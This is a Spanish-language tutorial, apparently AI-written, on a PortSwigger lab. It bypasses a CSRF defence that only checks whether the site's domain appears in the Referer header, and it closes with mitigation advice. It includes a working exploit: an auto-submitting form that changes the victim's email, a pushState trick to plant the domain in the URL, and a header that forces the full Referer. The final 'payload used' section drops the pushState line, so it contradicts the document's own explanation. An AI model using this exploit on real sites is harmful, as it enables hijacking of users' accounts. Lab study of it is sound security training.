
---

A continuación tienes un documento completo y pedagógico que explica este laboratorio, centrado en el problema de validación del Referer, el mecanismo de explotación, la necesidad de forzar el envío de la query string, y la peculiaridad de que el laboratorio solo funciona en Chrome.

---

# CSRF con validación de Referer vulnerable

## 1. Introducción

Este laboratorio demuestra una defensa defectuosa frente a ataques CSRF basada exclusivamente en el encabezado HTTP **Referer**.  
El servidor intenta impedir peticiones que provienen de dominios cruzados, pero la validación se limita a comprobar si el dominio legítimo aparece **en cualquier parte del valor del encabezado**, en lugar de verificar el origen real de la petición.

Esta validación laxa permite que un atacante construya un Referer manipulado que contenga el dominio objetivo como parte de una query string, lo cual es suficiente para que el servidor acepte la solicitud.

[Ver laboratorio Portswigger](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

---

## 2. Contexto del laboratorio

La funcionalidad vulnerable es la página de cambio de correo electrónico:

```
POST /my-account/change-email
```

Esta operación requiere que el usuario esté autenticado, pero no utiliza tokens CSRF.  
En su lugar, confía en la validación del encabezado **Referer** como único mecanismo defensivo.

El servidor espera ver en el encabezado:

```
Referer: https://<LAB-ID>.web-security-academy.net/...
```

Si el dominio no aparece, rechaza la petición con un error del tipo:

```
HTTP/1.1 400 Invalid referer header
```

Si el dominio aparece en cualquier posición, incluso incrustado dentro de otra URL arbitraria, el servidor considera válido el origen.

---

## 3. Identificación de la debilidad

Mediante Burp, comprobamos lo siguiente:

- Cambiar totalmente el dominio en el Referer provoca rechazo
    
- Incluir el dominio real dentro de una query string provoca aceptación
    

Ejemplo aceptado:

```
Referer: https://maligno.com/?<LAB-ID>.web-security-academy.net
```

Esto indica que la validación es equivalente a:

```pseudo
if expected_domain in Referer:
    allow
else:
    deny
```

Este enfoque ignora completamente el origen real y permite que un atacante construya Referers falsos válidos.

---

## 4. Incorporación del dominio legítimo en la URL

Para que el navegador genere un Referer con el dominio objetivo incrustado, se manipula la URL actual mediante JavaScript, añadiendo una query string que contenga el dominio.

Ejemplo:

```js
history.pushState("", "", "/?<LAB-ID>.web-security-academy.net");
```

Esto modifica la URL visible del navegador, pero no hace una navegación real.

Cuando el usuario envía una petición desde esta página, el navegador incluirá un Referer que contiene esa query string, y por tanto el dominio legítimo.

---

## 5. Problema adicional: los navegadores modernos eliminan la query string

La técnica explicada anteriormente depende de que el navegador incluya la query string de la URL actual en el Referer.

Sin embargo, los navegadores modernos **eliminan la query string del Referer por defecto**, como medida para evitar fuga de información sensible.

Efecto:

- Aunque manipulemos la URL
    
- El encabezado enviado puede ser simplemente:
    

```
Referer: https://atacante.com/
```

Lo cual no satisface la validación de substring y rompe el ataque.

---

## 6. Bypass de la protección del navegador

Para forzar al navegador a incluir la query string en el Referer, se utiliza la cabecera:

```
Referrer-Policy: unsafe-url
```

Esta política indica explícitamente al navegador que:

- Envíe URLs completas como Referer
    
- Incluya path y query string
    
- Incluso en contextos cross-site
    

Sin esta cabecera, el exploit falla silenciosamente en la mayoría de navegadores modernos.

---

## 7. Explotación completa

Desde el exploit server configuramos:

### Archivo:

```
file:
/<LAB-ID>.web-security-academy.net
```

### Cabeceras:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

### Cuerpo del exploit:

```html
<form class="login-form" name="change-email-form"
      action="https://<LAB-ID>.web-security-academy.net/my-account/change-email"
      method="POST">
    <input type="email" name="email" value="pwned@pwned.com">
</form>

<script>
    history.pushState("", "", "/?<LAB-ID>.web-security-academy.net");
    document.forms[0].submit();
</script>
```

Este código:

1. Manipula la URL mediante `pushState`
    
2. Inserta el dominio legítimo como parte de la query string
    
3. Modifica el Referer generado por el navegador
    
4. Envía automáticamente el formulario con el correo malicioso
    

El servidor aceptará el cambio porque encuentra el dominio objetivo en el valor del Referer.

---

## 8. Particularidad del laboratorio: solo funciona en Chrome

Este laboratorio presenta un detalle importante:

> El exploit solo funciona en navegadores basados en Chrome.  
> En Firefox, aunque se use `Referrer-Policy: unsafe-url`, el navegador puede seguir eliminando la query string en contextos cross-site. Esto es debido a que Firefox tiene políticas más restrictivas para referer cross-origin, incluso bajo `unsafe-url`

Esto afecta directamente a la explotación porque:

- El ataque depende de que la query string esté presente
    
- Sin ella, el dominio objetivo no aparece
    
- La validación falla
    

Por tanto, en Firefox es probable obtener:

```
HTTP/1.1 400 Invalid referer header
```

Este comportamiento está relacionado con diferencias entre implementaciones del estándar de referrer-policy.

---

## 9. Fundamentación de la vulnerabilidad

Este caso muestra varios errores de diseño:

1. Validación de Referer incompleta (substring matching)
    
2. Confianza en el Referer como defensa principal
    
3. No uso de tokens CSRF robustos
    
4. Falta de validación estricta del origen:
    
    - protocolo
        
    - host
        
    - puerto
        

El enfoque correcto sería validar el **origen** completo, no su representación textual.

---

## 10. Mitigaciones recomendadas

### 1. Uso de tokens CSRF

- Aleatorios
    
- Por sesión
    
- Verificados en backend
    

### 2. Validación estricta del origen

Comparar:

```
scheme://host:port
```

No usar substring.

### 3. Política de referrer restrictiva

Configurar:

```
Referrer-Policy: strict-origin-when-cross-origin
```

### 4. Cabeceras de seguridad adicionales

- SameSite cookies
    
- Content Security Policy
    

---

## 11. Payload utilizado

### HEAD

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

### BODY

```html
<form class="login-form" name="change-email-form" action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
    <input type="email" name="email" value="pwned@pwned.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Resultado:  
Se produce un cambio de correo cross-site aceptado por el servidor.

---

## 12. Conclusión

Este laboratorio ilustra cómo una validación superficial del encabezado Referer puede ser completamente inefectiva.  
Al manipular la URL del atacante para insertar el dominio objetivo dentro de una query string, y al forzar el navegador a incluirla mediante `Referrer-Policy: unsafe-url`, se consigue construir un Referer válido que permite ejecutar acciones sensibles en nombre de la víctima.

La dependencia de Chrome subraya otro punto clave:  
**el comportamiento del navegador forma parte del modelo de amenaza** y puede afectar directamente a la seguridad de la aplicación.

---
